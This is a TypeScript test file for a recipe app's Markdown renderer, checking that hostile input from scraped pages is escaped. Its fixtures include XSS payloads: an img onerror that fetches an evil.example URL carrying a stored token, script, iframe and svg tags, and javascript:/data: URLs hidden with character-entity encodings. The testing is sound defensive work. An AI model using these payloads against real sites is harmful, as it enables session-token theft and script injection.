import { describe, expect, it } from 'vitest';
import { renderMarkdown, safeUrl } from './markdown';

// The threat model is concrete: a recipe drafted from a hostile page. fetch_url
// takes an arbitrary URL, extraction copies JSON-LD recipeIngredient and
// Readability output verbatim, the model writes them into RecipeDoc.body, the
// export writes the body byte-for-byte, and this renderer puts it in the DOM.
// A payload that runs here can read localStorage['mise-token'] — the single
// static credential for the whole corpus.

/**
 * The element names the output actually produces. Asserting on this rather
 * than on substrings is the difference that matters: escaped markup still
 * *contains* the text "onerror", inertly, and a substring check would either
 * fail on correct output or pass on a tag we never inspected.
 */
function tagsIn(html: string): string[] {
	return [...html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)/g)].map((m) => m[1].toLowerCase());
}

describe('raw HTML never reaches the DOM as markup', () => {
	it('escapes an inline tag smuggled into an ingredient line', () => {
		const html = renderMarkdown(
			`400 g silken tofu<img src=x onerror="fetch('https://evil.example/?t='+localStorage['mise-token'])">`
		);
		expect(tagsIn(html)).toEqual(['p', 'p']);
		expect(html).toContain('&lt;img');
	});

	it('escapes a block-level script', () => {
		const html = renderMarkdown('<script>alert(1)</script>');
		expect(tagsIn(html)).not.toContain('script');
		expect(html).toContain('&lt;script');
	});

	it('escapes an event handler on a block element', () => {
		const html = renderMarkdown('<div onclick="alert(1)">block</div>');
		expect(tagsIn(html)).not.toContain('div');
		expect(html).toContain('&lt;div');
	});

	it('escapes an iframe and an svg payload', () => {
		expect(tagsIn(renderMarkdown('<iframe src="https://evil.example"></iframe>'))).not.toContain(
			'iframe'
		);
		expect(tagsIn(renderMarkdown('<svg><script>alert(1)</script></svg>'))).not.toContain('svg');
	});
});

describe('URLs that execute are refused', () => {
	it('strips a javascript: link', () => {
		expect(renderMarkdown('[click](javascript:alert(1))')).not.toContain('javascript:');
	});

	it('strips a javascript: image source', () => {
		expect(renderMarkdown('![alt](javascript:alert(1))')).not.toContain('javascript:');
	});

	it.each([
		['javascript:alert(1)', ''],
		['JaVaScRiPt:alert(1)', ''],
		['java\tscript:alert(1)', ''],
		['javascript:alert(1)', ''],
		['data:text/html;base64,PHNjcmlwdD4=', ''],
		['vbscript:msgbox(1)', '']
	])('refuses %j', (href, want) => {
		expect(safeUrl(href)).toBe(want);
	});

	it.each([
		'https://example.com/recipe',
		'http://example.com/recipe',
		'mailto:cook@example.com',
		'/page/recipes/mapo-tofu',
		'#ingredients',
		'relative/path.md'
	])('allows %j', (href) => {
		expect(safeUrl(href)).toBe(href);
	});
});

// The href is injected with {@html}, so the browser decodes character
// references inside it. `safeUrl` validates the raw text, so an entity-encoded
// scheme used to sail past — CSP was the only thing between it and
// localStorage['mise-token'], and schemes CSP doesn't govern were uncovered.
describe('entity-encoded URL schemes cannot execute', () => {
	// Numeric references are resolved before the check, so a numeric-encoded
	// colon is caught outright and the link is dropped.
	it.each([
		'javascript&#58;alert(1)',
		'javascript&#x3a;alert(1)',
		'&#106;avascript:alert(1)',
		'&#x6a;avascript:alert(1)',
		'javascript&#0000058;alert(1)'
	])('refuses the numeric-encoded %j', (href) => {
		expect(safeUrl(href)).toBe('');
	});

	// A browser decodes character references in one left-to-right pass and
	// never re-scans a '&' it just produced. This mirrors that for the refs in
	// play, so a test can ask the real question: what scheme does the href
	// resolve to in the DOM?
	function browserDecode(s: string): string {
		return s.replace(/&(amp|colon|tab|newline|#x[0-9a-f]+|#\d+);/gi, (m, name: string) => {
			const n = name.toLowerCase();
			if (n === 'amp') return '&';
			if (n === 'colon') return ':';
			if (n === 'tab') return '\t';
			if (n === 'newline') return '\n';
			if (n.startsWith('#x')) return String.fromCodePoint(parseInt(name.slice(2), 16));
			return String.fromCodePoint(parseInt(name.slice(1), 10));
		});
	}
	// Leading whitespace/controls the URL parser ignores before the scheme.
	const EXECUTES = /^\s*(?:javascript|data|vbscript):/i;

	// Named references can't be enumerated safely, so they are neutralized on
	// output instead: every & becomes &amp;, so no reference can re-form in the
	// attribute the browser decodes. The href resolves to an inert relative URL.
	it.each([
		'javascript&colon;alert(1)',
		'java&Tab;script:alert(1)',
		'&NewLine;javascript:alert(1)',
		'&Tab;javascript:alert(1)'
	])('neutralizes the named-encoded %j', (href) => {
		const out = safeUrl(href);
		expect(out).not.toMatch(/&(?!amp;)/); // no reference left unescaped
		expect(browserDecode(out)).not.toMatch(EXECUTES); // and it can't execute
	});

	it('holds through the full render — links, images, and reference definitions', () => {
		const hrefIn = (html: string) => html.match(/href="([^"]*)"/)?.[1] ?? '';
		for (const md of [
			`[full method](java&Tab;script:fetch('evil'))`,
			'![shot](javascript&colon;alert(1))',
			'[method][x]\n\n[x]: &#106;avascript:alert(1)'
		]) {
			expect(browserDecode(hrefIn(renderMarkdown(md)))).not.toMatch(EXECUTES);
		}
		// A genuine link is untouched and its query ampersand round-trips.
		const ok = renderMarkdown('[recipe](https://example.com/r?a=1&b=2)');
		expect(ok).toContain('href="https://example.com/r?a=1&amp;b=2"');
	});
});

describe('ordinary Markdown still renders', () => {
	it('keeps emphasis, code and safe links intact', () => {
		const html = renderMarkdown('Use **tamari** and `mirin` — see [the note](https://example.com).');
		expect(html).toContain('<strong>tamari</strong>');
		expect(html).toContain('<code>mirin</code>');
		expect(html).toContain('href="https://example.com"');
	});

	it('renders tables, which the pantry export leans on', () => {
		const html = renderMarkdown('| item | have |\n|---|---|\n| miso | yes |');
		expect(html).toContain('<table>');
		expect(html).toContain('<td>miso</td>');
	});

	it('leaves an ampersand in prose alone', () => {
		expect(renderMarkdown('salt & pepper')).toContain('salt &amp; pepper');
	});
});
